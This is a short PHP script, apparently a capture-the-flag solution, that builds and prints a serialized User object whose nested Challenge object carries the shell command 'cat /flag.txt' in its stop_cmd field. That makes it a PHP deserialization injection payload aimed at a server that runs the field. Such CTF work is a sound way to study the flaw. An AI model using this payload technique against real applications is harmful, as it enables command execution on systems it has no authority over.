<?php

class User{
  public $name;
  public $id;
  public $isAdmin;
  public $solved;
  public $points;
}

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;
}



$user = new User();
$chall = new Challenge;
$chall->name="aiuto";
$chall->description="provapro";
$user->points=12;
$user->name="ciaone";
$user->id=97090;
$chall->stop_cmd= "cat /flag.txt";
$challs=[];
$challs[0]=$chall;
$user->solved=$challs ;
echo serialize($user)
?>
